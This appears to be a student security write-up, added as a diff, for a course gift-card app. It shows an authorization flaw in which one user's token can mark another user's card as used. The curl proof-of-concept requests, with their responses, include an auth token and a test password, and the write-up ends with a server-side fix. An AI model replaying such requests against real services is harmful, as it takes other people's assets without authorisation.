@@ -1,0 +1,67 @@
+Bug Write-Up
+-------------
+
+After examining the code in CardInterface.kt and UserCard.kt, we saw that the backend is not
+validating the the user before the cards is being used.
+
+POC
+---
+
+To verify this we logged in as the user 'ra3717_1' and bought a couple of cards. We also created
+another user 'ra3717_2' and bought a card.
+
+Then I logged in using the curl as the 'ra3717_1' use and fetched all the cards.
+
+Login request
+====================================================================================================
+curl.exe -X POST -H 'Content-Type: application/json' -d '{"username":"ra3717_1", "password":"test"}'
+https://appsec.moyix.net/api/login
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   138  100    96  100    42    299    131 --:--:-- --:--:-- --:--:--
+432{"username":"ra3717_1","email":"abc@abc.com","token":"26e73cc048f257f4e2ca74ef80f790fe722b565a"}
+====================================================================================================
+
+Get Cards Request
+====================================================================================================
+$ curl.exe -X GET -H 'Authorization: Token 26e73cc048f257f4e2ca74ef80f790fe722b565a' -H
+'Content-Type: application/json' http://appsec.moyix.net/api/cards
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1107  100  1107    0     0   9626      0 --:--:-- --:--:-- --:--:--
+9626[{"data":"eyJtZXJjaGFudF9pZCI6ICJUYW5kb24gRm9vZCBDb3VydCBDYXJkIiwgImN1c3RvbWVyX2lkIjogInJhMzcxN18xIiwgInRvdGFsX3ZhbHVlIjogMjIsICJyZWNvcmRzIjogW3sicmVjb3JkX3R5cGUiOiAiYW1vdW50X2NoYW5nZSIsICJhbW91bnRfYWRkZWQiOiAyMDAwLCAic2lnbmF0dXJlIjogIlsgaW5zZXJ0IGNyeXB0byBzaWduYXR1cmUgaGVyZSBdNDg5NTA1In1dfQ==","product":{"product_id":2,"product_name":"Tandon Food Court Card","product_image_path":"/images/product_2.jpg","recommended_price":30,"description":"Use this card to buy food at the Tandon Food Court!"},"amount":22,"used":false,"id":191},{"data":"eyJtZXJjaGFudF9pZCI6ICJTZW1lc3RlcidzIEJvb2sgQ2FyZCIsICJjdXN0b21lcl9pZCI6ICJyYTM3MTdfMSIsICJ0b3RhbF92YWx1ZSI6IDUwMCwgInJlY29yZHMiOiBbeyJyZWNvcmRfdHlwZSI6ICJhbW91bnRfY2hhbmdlIiwgImFtb3VudF9hZGRlZCI6IDIwMDAsICJzaWduYXR1cmUiOiAiWyBpbnNlcnQgY3J5cHRvIHNpZ25hdHVyZSBoZXJlIF0zNjA1NzMifV19","product":{"product_id":4,"product_name":"Semester's Book Card","product_image_path":"/images/product_5.jpg","recommended_price":777,"description":"So much to read, so little time. Buy this to make payment at the book store quicker and easier!"},"amount":500,"used":false,"id":192}]
+====================================================================================================
+
+We got the 2 cards that we have bought with the respective card IDs. The card IDs for the cards are
+191 and 192. We also fetch the card ID of the cards bought by the user 'ra3717_2'. The card ID for
+'ra3717_2' is 193.
+
+Now using the Authorization Token of user 'ra3717_1' we tried to use the card with card ID 193 that
+belongs to the user 'ra3717_2'.
+
+We made following PUT request to the /api/use/{card_no} API
+
+Use Card Request
+====================================================================================================
+$ curl.exe -X PUT -H 'Authorization: Token 26e73cc048f257f4e2ca74ef80f790fe722b565a' -H 'Content-Type: application/json' https://appsec.moyix.net/api/use/193
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   577  100   577    0     0   2878      0 --:--:-- --:--:-- --:--:--
+2899{"card":{"data":"eyJtZXJjaGFudF9pZCI6ICJOWVUgRWxlY3Ryb25pY3MgQ2FyZCIsICJjdXN0b21lcl9pZCI6ICJyYTM3MTdfMiIsICJ0b3RhbF92YWx1ZSI6IDU1LCAicmVjb3JkcyI6IFt7InJlY29yZF90eXBlIjogImFtb3VudF9jaGFuZ2UiLCAiYW1vdW50X2FkZGVkIjogMjAwMCwgInNpZ25hdHVyZSI6ICJbIGluc2VydCBjcnlwdG8gc2lnbmF0dXJlIGhlcmUgXTQzNTI3NCJ9XX0=","product":{"product_id":5,"product_name":"NYU Electronics Card","product_image_path":"/images/product_6.jpg","recommended_price":500,"description":"Need a new laptop? No problem! This card can be used to buy electronics at the NYU Bookstore."},"amount":55,"used":true,"id":193}}
+====================================================================================================
+
+We can see in the response that the "used" field in the card is True now and on the android app the
+card is no longer available for the user 'ra3717_2' to use to purchase products.
+
+Explanation of bug
+-------------------
+
+This bug arose as there is no validation that the card requested by user for usage actually belongs
+to the user. This way any valid user can use a cards that belong to other user.
+
+Fix for the bug
+----------------
+
+This bug cannot be fixed at the application end (client side) as this is a backend API issue. The
+solution is that the logic behind the /api/use/{card_no} should check whether the {card_no} belong
+to the user who requested the card usage.
